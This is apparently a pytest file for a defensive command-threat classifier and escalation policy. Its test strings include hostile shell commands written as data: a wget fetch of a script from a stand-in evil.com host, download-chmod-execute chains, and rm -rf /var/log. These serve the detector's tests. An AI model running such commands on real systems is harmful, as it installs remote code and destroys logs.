from models import HeuristicSequenceModel, RuleBasedClassifier, ThresholdDecisionPolicy, build_classifier


class TestRuleBasedClassifier:
    def setup_method(self):
        self.clf = RuleBasedClassifier()

    def test_benign_command(self):
        result = self.clf.classify("echo hello")
        assert result["label"] == "benign"

    def test_suspicious_command(self):
        result = self.clf.classify("whoami")
        assert result["label"] == "suspicious"

    def test_malicious_command(self):
        result = self.clf.classify("wget http://evil.com/x.sh")
        assert result["label"] == "malicious"
        assert result["score"] > 0.5

    def test_malicious_keyword_takes_priority_over_suspicious(self):
        # Contains both a suspicious keyword (whoami) and a malicious one (wget)
        result = self.clf.classify("whoami && wget http://evil.com/x.sh")
        assert result["label"] == "malicious"


class TestHeuristicSequenceModel:
    def setup_method(self):
        self.model = HeuristicSequenceModel()

    def test_empty_sequence_scores_zero(self):
        assert self.model.score([], set()) == 0

    def test_longer_sequence_scores_higher_than_shorter(self):
        short_score = self.model.score(["whoami"], set())
        long_score = self.model.score(["whoami"] * 10, set())
        assert long_score > short_score

    def test_tactic_diversity_increases_score(self):
        low = self.model.score(["whoami"], {"Discovery"})
        high = self.model.score(["whoami"], {"Discovery", "Persistence", "Impact"})
        assert high > low

    def test_malicious_density_increases_score(self):
        clean = self.model.score(["whoami", "ls"], set())
        dirty = self.model.score(["wget x", "chmod 777 x", "./x"], set())
        assert dirty > clean

    def test_score_caps_at_100(self):
        sequence = ["wget x && chmod 777 x && rm -rf /var/log"] * 50
        score = self.model.score(sequence, {"Discovery", "Persistence", "Impact", "Execution"})
        assert score <= 100


class TestThresholdDecisionPolicy:
    def setup_method(self):
        self.policy = ThresholdDecisionPolicy()

    def test_benign_low_risk_holds(self):
        classification = {"label": "benign", "score": 0.1}
        result = self.policy.decide(classification, sequence_score=0, mitre_matches=[])
        assert result["decision"] == "HOLD"
        assert result["risk_score"] < 70

    def test_malicious_high_sequence_escalates(self):
        classification = {"label": "malicious", "score": 0.9}
        mitre = [{"tactic": "Credential Access"}]
        result = self.policy.decide(classification, sequence_score=80, mitre_matches=mitre)
        assert result["decision"] == "ESCALATE"
        assert result["risk_score"] >= 70

    def test_high_severity_tactic_adds_bonus(self):
        classification = {"label": "suspicious", "score": 0.5}
        without_severity = self.policy.decide(classification, sequence_score=50, mitre_matches=[])
        with_severity = self.policy.decide(
            classification, sequence_score=50, mitre_matches=[{"tactic": "Impact"}]
        )
        assert with_severity["risk_score"] > without_severity["risk_score"]
        assert with_severity["mitre_severity_bonus"] == 15

    def test_result_shape(self):
        result = self.policy.decide({"label": "benign", "score": 0.1}, 0, [])
        assert set(result.keys()) >= {
            "risk_score", "decision", "confidence", "label", "sequence_score", "mitre_severity_bonus",
        }


def test_build_classifier_uses_rule_based_when_pretrained_disabled():
    # conftest.py sets USE_PRETRAINED_NLP=false *before* this module (and
    # therefore escalation_engine.models) is ever imported, since that flag
    # is read once at import time, not per-call.
    clf = build_classifier()
    assert isinstance(clf, RuleBasedClassifier)
